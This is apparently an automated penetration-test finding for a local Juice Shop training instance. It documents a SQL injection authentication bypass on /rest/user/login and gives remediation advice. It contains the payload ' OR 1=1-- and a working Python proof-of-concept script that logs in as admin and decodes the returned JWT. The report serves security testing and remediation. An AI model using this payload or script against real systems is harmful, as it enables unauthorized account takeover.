# SQL Injection Authentication Bypass in Login Form

**ID:** vuln-0001
**Severity:** CRITICAL
**Found:** 2026-09-04 15:40:23 UTC
**Target:** http://host.docker.internal:3100
**Endpoint:** /rest/user/login
**Method:** POST
**CWE:** CWE-89
**CVSS:** 9.8
**Confidence:** High
**Fix Effort:** Low

## Description

The login endpoint is vulnerable to SQL injection in the email parameter, allowing attackers to bypass authentication and log in as any user without knowing their password. The vulnerability exists due to improper input validation or parameterization of the SQL query.

## Evidence

Working proof of concept demonstrates successful authentication bypass. A POST request with SQLi payload `' OR 1=1--` returns HTTP 200 with a valid JWT token for the admin user. The JWT payload contains user data showing ID=1, Email=admin@juice-sh.op, Role=admin, confirming successful authentication as the admin without providing the correct password.

## Impact

An attacker can bypass authentication and gain unauthorized access to user accounts, including administrative accounts. This allows complete compromise of the application and access to all user data.

## Counterevidence

No input validation or parameterized query protection was found. The application accepts and processes SQL syntax in the email parameter without escaping or parameterization. Multiple SQL injection syntaxes were successfully tested and confirmed working. No WAF or query filtering was observed.

## What Would Change This Severity

None - this is a critical vulnerability as-is. It allows complete authentication bypass without any prerequisites.

## Technical Analysis

The application constructs a SQL query using unsanitized user input from the email parameter in the login form. The database is likely executing a query similar to: `SELECT * FROM users WHERE email = '[email]' AND password = '[password_hash]'`. By injecting SQL syntax like `' OR 1=1--`, the attacker modifies the query logic to: `SELECT * FROM users WHERE email = '' OR 1=1--' AND password = ...` which evaluates to true for the first user (typically the admin). This returns the first user's record without requiring a valid password.

## Proof of Concept

1. Send a POST request to `/rest/user/login` with JSON payload containing `{"email": "' OR 1=1--", "password": "anything"}`
2. The server responds with HTTP 200 and a JWT authentication token
3. Decode the JWT token to verify successful authentication as the admin user (ID: 1, Email: admin@juice-sh.op, Role: admin)
4. The JWT token can be used for subsequent API requests to perform actions as an authenticated admin

```python
#!/usr/bin/env python3
import requests
import json
import base64

base_url = "http://host.docker.internal:3100"
login_url = f"{base_url}/rest/user/login"

# Exploit SQL injection in login
payload = {
    "email": "' OR 1=1--",
    "password": "irrelevant"
}

response = requests.post(login_url, json=payload, timeout=10)

if response.status_code == 200:
    data = response.json()
    token = data['authentication']['token']
    
    # Decode JWT to verify admin access
    parts = token.split('.')
    payload_padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
    decoded = json.loads(base64.urlsafe_b64decode(payload_padded))
    
    print(f"[+] Authentication bypass successful!")
    print(f"[+] Logged in as: {decoded['data']['email']}")
    print(f"[+] Role: {decoded['data']['role']}")
    print(f"[+] JWT Token: {token[:50]}...")
else:
    print(f"[-] Attack failed: {response.status_code}")
```

## Remediation

Implement parameterized queries or prepared statements for all database operations. The login query should use parameter binding to separate SQL code from user input. Example: Use query parameters like `SELECT * FROM users WHERE email = ? AND password = ?` and pass email and password as separate parameters to the database driver. Additionally, implement input validation to reject email addresses containing SQL keywords or special characters, and implement rate limiting on failed login attempts to mitigate brute force attacks.

## Assumptions

Assumes the attacker has network access to the login endpoint. No authentication is required to attempt login.
